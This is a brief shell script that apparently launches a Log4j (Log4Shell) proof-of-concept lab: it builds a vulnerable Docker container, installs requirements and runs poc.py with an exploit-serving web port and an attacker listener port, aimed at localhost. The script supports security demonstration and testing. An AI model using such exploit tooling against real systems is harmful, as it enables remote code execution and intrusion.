#! /bin/sh
sudo docker build . -t log4j-proof && sudo docker run -d --network host log4j-proof 
pip install -r requirements.txt

# webport is for http server that serves exploit
# lport is for listener port on attacker machine
python3 poc.py --userip localhost --webport 8888 --lport 9001